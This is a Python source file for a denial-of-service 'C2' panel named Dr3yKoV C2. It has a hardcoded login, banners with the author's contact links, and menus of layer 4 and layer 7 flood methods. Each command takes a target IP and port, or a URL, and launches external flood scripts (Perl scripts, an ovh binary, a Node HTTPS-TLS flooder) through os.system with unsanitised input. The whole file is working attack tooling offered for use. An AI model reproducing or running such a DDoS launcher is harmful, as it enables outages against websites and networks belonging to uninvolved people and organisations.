import socket
import os
import requests
import random
import getpass
import time
import sys

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

proxys = open('proxies.txt').readlines()
bots = len(proxys)

def ascii_vro():
    time.sleep(1)
    clear()
    print(f"""
\033[91m                                   ╦  ╔═╗╔═╗╦╔╗╔
\033[91m                                   ║  ║ ║║ ╦║║║║
\033[91m                                   ╩═╝╚═╝╚═╝╩╝╚╝
\033[91m                               "𝕿𝖍𝖊 𝖜𝖆𝖗 𝖜𝖆𝖘 𝖓𝖊𝖛𝖊𝖗 𝖔𝖛𝖊𝖗" 
\033[91m               ╚╦══════════════════════════════════════════════╦╝
\033[91m                ║ ....HELLO....║ WELCOME TO Dr3yKoV C2 BY NTV  ║
\033[91m                ╚══════════════════════════════════════════════╝
    
\033[91m                                      LOADING ...
    """)
    time.sleep(3)
    clear()

def help():
    clear()
    si()
    print(f'''Layer4  ► SHOW METHODS ATTACK LAYER4
Layer7  ► SHOW METHODS ATTACK LAYER7
''') 
def layer4():
    clear()
    si()
    print(f'''     METHODS ATTACK LAYER 4 BY NGUYEN THANH VINH\033[0m
  -   \033[95movh-kill    \033[97m►  \033[92mONLINE\033[0m
  -   \033[95mstress-mix  \033[97m►  \033[92mONLINE\033[0m
  -   \033[95mackv2       \033[97m►  \033[92mONLINE\033[0m
  -   \033[95mhex-std     \033[97m►  \033[92mONLINE\033[0m
  -   \033[95mnuke-mix    \033[97m►  \033[91mOFFLINE\033[0m
\x1b[38;2;0;255;255mUsage :   <METHOD> <ip> <port> <time>\033[0m
''') 
def layer7():
    clear()
    si()
    print(f'''     METHODS ATTACK LAYER 7 BY NGUYEN THANH VINH\033[0m
  -   \033[95mhydra-mix        \033[97m►  \033[92mONLINE\033[0m
  -   \033[95mhttps-kill       \033[97m►  \033[92mONLINE\033[0m
  -   \033[95msuper-ultra      \033[97m►  \033[92mONLINE\033[0m
  -   \033[95mtls-shadow       \033[97m►  \033[92mONLINE\033[0m
  -   \033[95mlegacy-bypass    \033[97m►  \033[92mONLINE\033[0m
  -   \033[95mhttps-nosec      \033[97m►  \033[92mONLINE\033[0m
  -   \033[95mhttps-load       \033[97m►  \033[92mONLINE\033[0m
  -   \033[95mtls-stunx        \033[97m►  \033[92mONLINE\033[0m
  -   \033[95mhttps-bee        \033[97m►  \033[92mONLINE\033[0m
  -   \033[95mhttps-ping       \033[97m►  \033[92mONLINE\033[0m
  -   \033[95mhttps-browser    \033[97m►  \033[92mONLINE\033[0m
  -   \033[95mhttps-godv5      \033[97m►  \033[92mONLINE\033[0m
  -   \033[95mdestroy-all      \033[97m►  \033[91mOFFLINE\033[0m
\x1b[38;2;0;255;255mUsage :   <METHOD> <url> <time> <request> <thread> proxy.txt\033[0m
''') 
def si():
    print('         \x1b[38;2;0;255;255m[ \x1b[38;2;233;233;233mDr3yKoV C2 \x1b[38;2;0;255;255m] | \x1b[38;2;233;233;233mWelcome to Dr3yKoV C2 \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mOwner: Ng Thanh Vinh \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mPower C2')
def menu():
    sys.stdout.write(f"         \x1b]2;Dr3yKoV C2 Stars: [152713] | Online Usagers: [26] | Methods: [12] | Bypass: [10] | Amps: [1]\x07")
    clear()
    print('\x1b[38;2;0;255;255m[ \x1b[38;2;233;233;233mC2 Stars: [152713]\x1b[38;2;0;255;255m | \x1b[38;2;233;233;233mWelcome to Dr3yKoV C2 \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mOwner: Ng Thanh Vinh \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mPower C2 \x1b[38;2;0;255;255m]\033[0m')
    print("""
\x1b[38;2;0;255;255m╔═══════════════════════════════════════════════════════════════════════════════════════════════════╗
\x1b[38;2;0;255;255m║\033[0m                                                       \033[38;2;225;255;0m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\033[0m \x1b[38;2;0;255;255m║
\x1b[38;2;0;255;255m║\033[0m               \033[31mADMIN : Nguyen Thanh Vinh\033[0m               \033[38;2;225;255;0m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⣴⣾⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\033[0m \x1b[38;2;0;255;255m║
\x1b[38;2;0;255;255m║\033[0m                                                       \033[38;2;225;255;0m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢹⣿⣿⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\033[0m \x1b[38;2;0;255;255m║
\x1b[38;2;0;255;255m║\033[0m                                                       \033[38;2;225;255;0m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⣾⣿⣿⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢟⣛⣿⣭⠉⠉⢉⣽⣿⣿⣿⣿⣿⣿\033[0m \x1b[38;2;0;255;255m║
\x1b[38;2;0;255;255m║\033[0m         \033[35mContact Information:\033[0m                          \033[38;2;225;255;0m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⡿⣟⣫⣭⣭⣭⣭⣽⣛⠿⣛⣭⣶⣿⣿⣿⡿⢟⣠⣶⣿⣿⣿⣿⣿⣿⣿⣿\033[0m \x1b[38;2;0;255;255m║
\x1b[38;2;0;255;255m║\033[0m                                                       \033[38;2;225;255;0m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢇⣾⣿⣿⣿⣿⣿⣿⣿⣿⣾⣿⣿⠿⣟⣯⣵⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\033[0m \x1b[38;2;0;255;255m║
\x1b[38;2;0;255;255m║\033[0m      \033[35m- https://t.me/iamDreyKoV\033[0m                        \033[38;2;225;255;0m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⡼⠩⡝⣿⣿⣿⣿⣿⠟⡛⠻⣿⣷⢻⣿⣿⠿⣟⣻⣿⣭⣭⣿⣸⣿⣿⣿⣿⣿\033[0m \x1b[38;2;0;255;255m║
\x1b[38;2;0;255;255m║\033[0m      \033[35m- https://m.me/NTVxDreyKoV\033[0m                       \033[38;2;225;255;0m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢣⣷⣤⣤⣿⠯⣽⣿⣿⣄⣀⣰⣿⣿⢨⣵⣾⣿⣿⣿⣿⣿⣿⢣⣿⣿⣿⣿⣿⣿\033[0m \x1b[38;2;0;255;255m║
\x1b[38;2;0;255;255m║\033[0m      \033[35m- https://m.me/NgThanhVinh.Chjllix\033[0m               \033[38;2;225;255;0m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⣶⡎⣿⣎⣡⣾⣶⣭⢩⣿⡿⣫⣝⢻⢸⣿⣿⣿⣿⣿⣿⣿⢯⣿⣿⣿⣿⣿⣿⣿\033[0m \x1b[38;2;0;255;255m║
\x1b[38;2;0;255;255m║\033[0m      \033[35m- https://dr3ykov.github.io\033[0m                      \033[38;2;225;255;0m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡉⣵⣿⣿⡜⣿⣿⡟⣼⣿⣧⡻⠿⡁⣼⣿⢛⣛⣛⣛⣛⣫⣿⣿⣿⣿⣿⣿⣿⣿\033[0m \x1b[38;2;0;255;255m║
\x1b[38;2;0;255;255m║\033[0m                                                       \033[38;2;225;255;0m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡎⡻⣿⣿⣝⣫⣼⣿⣿⣿⣿⡿⡱⡝⣿⣏⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\033[0m \x1b[38;2;0;255;255m║
\x1b[38;2;0;255;255m║\033[0m                                                       \033[38;2;225;255;0m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠳⣿⣾⣽⣿⣿⣿⣿⣿⣯⣷⣾⡇⢛⣬⡿⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\033[0m \x1b[38;2;0;255;255m║
\x1b[38;2;0;255;255m║\033[0m                                                       \033[38;2;225;255;0m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠻⢿⣿⠏⡇⣿⣿⣿⣿⡿⡿⣽⣿⣿⣿⣿⣻⡌⢷⡾⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\033[0m \x1b[38;2;0;255;255m║
\x1b[38;2;0;255;255m║\033[0m                                                       \033[38;2;225;255;0m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡀⠈⣾⣿⣷⢻⣿⣿⣿⣷⢡⣿⣿⣿⣿⢏⣶⣿⡷⣄⣀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\033[0m \x1b[38;2;0;255;255m║
\x1b[38;2;0;255;255m║\033[0m          \033[93mWishing You All A Very\033[0m                       \033[38;2;225;255;0m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢸⣷⢹⣿⣿⣎⢿⣿⣿⣿⢸⣿⣿⣿⡟⣾⣿⣿⣷⡿⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\033[0m \x1b[38;2;0;255;255m║
\x1b[38;2;0;255;255m║\033[0m                         \033[93mHappy New Day <3\033[0m              \033[38;2;225;255;0m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⢻⡿⣿⣿⣿⣎⢿⣿⣿⣾⣿⣿⢟⣾⣿⣿⡏⣿⢣⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\033[0m \x1b[38;2;0;255;255m║
\x1b[38;2;0;255;255m║\033[0m                                                       \033[38;2;225;255;0m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣶⣶⣿⣯⣤⣉⣭⣜⣙⣛⣨⣭⣭⣭⣥⣵⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\033[0m \x1b[38;2;0;255;255m║
\x1b[38;2;0;255;255m╚═══════════════════════════════════════════════════════════════════════════════════════════════════╝
""")

def main():
    menu()
    while(True):
        cnc = input(f"""\033[30;47m\033[30mDr3yKoV \033[0m\033[30;47m\033[30m@ \033[0m\033[30;47m\033[30mC2\033[0m\033[30;47m\033[30m ●>> \033[0m""")
        if cnc == "layer7" or cnc == "Layer7" or cnc == "L7" or cnc == "l7":
            layer7()
        elif cnc == "layer4" or cnc == "Layer4" or cnc == "L4" or cnc == "l4":
            layer4()
        elif cnc == "clear" or cnc == "CLEAR" or cnc == "CLS" or cnc == "cls":
            main()
        elif cnc == "tools" or cnc == "tool" or cnc == "TOOLS" or cnc == "TOOL":
            tools()
        elif cnc == "help" or cnc == "HELP" or cnc == "Help" or cnc == "cuu":
            help()


# LAYER 4 METHODS   
        elif "ovh-kill" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                time = cnc.split()[3]
                os.system(f'perl batman.pl {ip} {port} 5 {time}')
            except IndexError:
                print('Example: ovh-kill 1.1.1.1 80 60')

        elif "ackv2" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                time = cnc.split()[3]
                os.system(f'perl destroy.pl {ip} {port} 5 {time}')
            except IndexError:
                print('Example: ackv2 1.1.1.1 80 60')

        elif "hex-std" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                time = cnc.split()[3]
                os.system(f'perl demon.pl {ip} {port} 5 {time}')
            except IndexError:
                print('Example: hex-std 1.1.1.1 80 60')

        elif "stress-mix" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                time = cnc.split()[3]
                os.system(f'perl Viking4.pl {ip} {port} 5 {time}')
            except IndexError:
                print('Example: stress-mix 1.1.1.1 80 60')

        elif "nuke-mix" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                time = cnc.split()[3]
                os.system(f'./ovh -d {ip} -p {port} -t {time} -z 130')
            except IndexError:
                print('Example: nuke-mix 1.1.1.1 80 60')
#LAYER7 METHODS
        elif "hydra-mix" in cnc:
            try:
                url=cnc.split()[1]
                time =cnc.split()[2]
                request=cnc.split()[3]
                thread=cnc.split()[4]
                print(f"""Attack Send Successfully ! {url} port 443 for {time} seconds.
""")
                os.system(f'node ./data/HTTPS-TLS.js  {url} {time} {request} {thread} proxy.txt')
            except IndexError:
                print('Example: hydra-mix https://dr3ykov.github.io/ 120 64 5 proxy.txt')
        
        elif "https-kill" in cnc:
            try:
                url=cnc.split()[1]
                time =cnc.split()[2]
                request=cnc.split()[3]
                thread=cnc.split()[4]
                print(f"""Attack Send Successfully ! {url} port 443 for {time} seconds.
""")
                os.system(f'node ./data/HTTPS-TLS.js  {url} {time} {request} {thread} proxy.txt')
            except IndexError:
                print('Example: https-kill https://dr3ykov.github.io/ 120 64 5 proxy.txt')

        elif "super-ultra" in cnc:
            try:
                url=cnc.split()[1]
                time =cnc.split()[2]
                request=cnc.split()[3]
                thread=cnc.split()[4]
                print(f"""Attack Send Successfully ! {url} port 443 for {time} seconds.
""")
                os.system(f'node ./data/HTTPS-TLS.js  {url} {time} {request} {thread} proxy.txt')
            except IndexError:
                print('Example: super-ultra https://dr3ykov.github.io/ 120 64 5 proxy.txt')

        elif "tls-shadow" in cnc:
            try:
                url=cnc.split()[1]
                time =cnc.split()[2]
                request=cnc.split()[3]
                thread=cnc.split()[4]
                print(f"""Attack Send Successfully ! {url} port 443 for {time} seconds.
""")
                os.system(f'node ./data/HTTPS-TLS.js  {url} {time} {request} {thread} proxy.txt')
            except IndexError:
                print('Example: tls-shadow https://dr3ykov.github.io/ 120 64 5 proxy.txt')

        elif "legacy-bypass" in cnc:
            try:
                url=cnc.split()[1]
                time =cnc.split()[2]
                request=cnc.split()[3]
                thread=cnc.split()[4]
                print(f"""Attack Send Successfully ! {url} port 443 for {time} seconds.
""")
                os.system(f'node ./data/HTTPS-TLS.js  {url} {time} {request} {thread} proxy.txt')
            except IndexError:
                print('Example: legacy-bypass https://dr3ykov.github.io/ 120 64 5 proxy.txt')

        elif "https-nosec" in cnc:
            try:
                url=cnc.split()[1]
                time =cnc.split()[2]
                request=cnc.split()[3]
                thread=cnc.split()[4]
                print(f"""Attack Send Successfully ! {url} port 443 for {time} seconds.
""")
                os.system(f'node ./data/HTTPS-TLS.js  {url} {time} {request} {thread} proxy.txt')
            except IndexError:
                print('Example: https-nosec https://dr3ykov.github.io/ 120 64 5 proxy.txt')

        elif "https-load" in cnc:
            try:
                url=cnc.split()[1]
                time =cnc.split()[2]
                request=cnc.split()[3]
                thread=cnc.split()[4]
                print(f"""Attack Send Successfully ! {url} port 443 for {time} seconds.
""")
                os.system(f'node ./data/HTTPS-TLS.js  {url} {time} {request} {thread} proxy.txt')
            except IndexError:
                print('Example: https-load https://dr3ykov.github.io/ 120 64 5 proxy.txt')

        elif "tls-stunx" in cnc:
            try:
                url=cnc.split()[1]
                time =cnc.split()[2]
                request=cnc.split()[3]
                thread=cnc.split()[4]
                print(f"""Attack Send Successfully ! {url} port 443 for {time} seconds.
""")
                os.system(f'node ./data/HTTPS-TLS.js  {url} {time} {request} {thread} proxy.txt')
            except IndexError:
                print('Example: tls-stunx https://dr3ykov.github.io/ 120 64 5 proxy.txt')

        elif "https-bee" in cnc:
            try:
                url=cnc.split()[1]
                time =cnc.split()[2]
                request=cnc.split()[3]
                thread=cnc.split()[4]
                print(f"""Attack Send Successfully ! {url} port 443 for {time} seconds.
""")
                os.system(f'node ./data/HTTPS-TLS.js  {url} {time} {request} {thread} proxy.txt')
            except IndexError:
                print('Example: https-bee https://dr3ykov.github.io/ 120 64 5 proxy.txt')

        elif "https-ping" in cnc:
            try:
                url=cnc.split()[1]
                time =cnc.split()[2]
                request=cnc.split()[3]
                thread=cnc.split()[4]
                print(f"""Attack Send Successfully ! {url} port 443 for {time} seconds.
""")
                os.system(f'node ./data/HTTPS-TLS.js  {url} {time} {request} {thread} proxy.txt')
            except IndexError:
                print('Example: https-ping https://dr3ykov.github.io/ 120 64 5 proxy.txt')

        elif "https-browser" in cnc:
            try:
                url=cnc.split()[1]
                time =cnc.split()[2]
                request=cnc.split()[3]
                thread=cnc.split()[4]
                print(f"""Attack Send Successfully ! {url} port 443 for {time} seconds.
""")
                os.system(f'node ./data/HTTPS-TLS.js  {url} {time} {request} {thread} proxy.txt')
            except IndexError:
                print('Example: https-browser https://dr3ykov.github.io/ 120 64 5 proxy.txt')

        elif "https-godv5" in cnc:
            try:
                url=cnc.split()[1]
                time =cnc.split()[2]
                request=cnc.split()[3]
                thread=cnc.split()[4]   
                print(f"""Attack Send Successfully ! {url} port 443 for {time} seconds.
""")
                os.system(f'node ./data/HTTPS-TLS.js  {url} {time} {request} {thread} proxy.txt')
            except IndexError:
                print('Example: https-godv5 https://dr3ykov.github.io/ 120 64 5 proxy.txt')

        else:
            try:
                cmmnd = cnc.split()[0]
                print("Command: [ " + cmmnd + " ] ERROR COMMAND !")
            except IndexError:
                pass

def login():
    clear()
    Usager = "root"
    passwd = "thanhvinh"
    Usagername = input("USER LOGIN: ")
    password = getpass.getpass(prompt='PASS LOGIN: ')
    if Usagername != Usager or password != passwd:
        print("")
        print("ERROR")
        sys.exit(1)
    elif Usagername == Usager and password == passwd:
        print("SUCCESS")
        time.sleep(0.1)
        ascii_vro()
        main()

login()